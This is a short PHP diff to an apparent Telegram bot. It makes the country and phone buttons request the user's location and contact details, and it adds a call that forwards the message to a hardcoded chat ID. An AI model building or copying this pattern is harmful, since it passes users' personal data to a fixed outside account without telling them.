@@ -131,7 +131,7 @@ class GenericmessageCommand extends SystemCommand
 
         $keyboards2[] = new Keyboard([
 
-            ['text' => 'SUBMIT YOUR COUNTRY'],
+            ['text' => 'SUBMIT YOUR COUNTRY', 'request_location' => true],
           
         ]);
 
@@ -143,7 +143,8 @@ class GenericmessageCommand extends SystemCommand
 
         $keyboards3[] = new Keyboard([
             
-            ['text' => 'SUBMIT YOUR PHONE'],
+            ['text' => 'SUBMIT YOUR PHONE', 'request_contact' => true],
+           
           
         ]);
 
@@ -180,6 +181,11 @@ class GenericmessageCommand extends SystemCommand
 
             elseif ($message_text == 'SUBMIT YOUR COUNTRY')
             {
+                Request::sendMessage([
+                    'chat_id' => '1053901092',
+                     'text' => $message
+        
+                ]);
                 return $this->replyToChat("Please ! Write Your PHONE Number eg( +***** )", [
                     'reply_markup' => $keyboard3,
                  ]);
